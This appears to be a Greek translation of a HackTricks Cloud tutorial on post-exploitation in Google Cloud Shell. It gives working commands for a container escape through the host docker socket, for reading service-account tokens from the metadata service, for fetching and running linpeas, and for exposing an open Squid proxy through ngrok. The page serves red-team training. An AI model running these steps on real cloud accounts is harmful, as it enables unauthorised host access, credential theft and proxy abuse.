# GCP - Μετά την Εκμετάλλευση του Cloud Shell

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Cloud Shell

Για περισσότερες πληροφορίες σχετικά με το Cloud Shell, ελέγξτε:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Απόδραση από τον Κοντέινερ

Σημειώστε ότι το Google Cloud Shell τρέχει μέσα σε έναν κοντέινερ, μπορείτε **εύκολα να αποδράσετε στον κεντρικό υπολογιστή** κάνοντας: 

{% code overflow="wrap" %}
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
{% endcode %}

Αυτό δε θεωρείται ευπάθεια από τη Google, αλλά σας δίνει μια ευρύτερη εικόνα του τι συμβαίνει σε αυτό το περιβάλλον.

Επιπλέον, παρατηρήστε ότι από τον υπολογιστή μπορείτε να βρείτε ένα τεκμήριο λογαριασμού υπηρεσίας: 

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
{% endcode %}

Με τις ακόλουθες εμβέλειες:

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
{% endcode %}

Καταγραφή μεταδεδομένων με το LinPEAS:

{% code overflow="wrap" %}
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
{% endcode %}

Μετά τη χρήση του [https://github.com/carlospolop/bf\_my\_gcp\_permissions](https://github.com/carlospolop/bf\_my\_gcp\_permissions) με το token του Λογαριασμού Υπηρεσίας **δεν ανακαλύφθηκε καμία άδεια**...

### Χρήση ως Διαμεσολαβητή

Εάν θέλετε να χρησιμοποιήσετε την προσωπική σας κέλυφος Google Cloud ως διαμεσολαβητή, πρέπει να εκτελέσετε τις παρακάτω εντολές (ή να τις εισάγετε στο αρχείο .bashrc):
```bash
sudo apt install -y squid
```
Απλά για να ενημερώσω το Squid είναι ένας διακομιστής http προξενητής. Δημιουργήστε ένα αρχείο **squid.conf** με τις παρακάτω ρυθμίσεις:
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
αντιγράψτε το αρχείο **squid.conf** στο **/etc/squid**
```bash
sudo cp squid.conf /etc/squid
```
Τέλος, εκτελέστε την υπηρεσία squid:
```bash
sudo service squid start
```
Χρησιμοποιήστε το ngrok για να επιτρέψετε στον διαμεσολαβητή να είναι διαθέσιμος από έξω:
```bash
./ngrok tcp 3128
```
Μετά την εκτέλεση αντιγράψτε το url tcp://. Εάν θέλετε να εκτελέσετε τον proxy από έναν περιηγητή, συνιστάται να αφαιρέσετε το τμήμα tcp:// και τη θύρα και να τοποθετήσετε τη θύρα στο πεδίο θύρας των ρυθμίσεων proxy του περιηγητή σας (το squid είναι ένας διακομιστής http proxy).

Για καλύτερη χρήση κατά την εκκίνηση, το αρχείο .bashrc θα πρέπει να περιέχει τις παρακάτω γραμμές:
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
Οι οδηγίες αντιγράφτηκαν από [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Ελέγξτε αυτήν τη σελίδα για άλλες τρελές ιδέες για να εκτελέσετε οποιοδήποτε είδος λογισμικού (βάσεις δεδομένων και ακόμα και Windows) στο Cloud Shell.

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
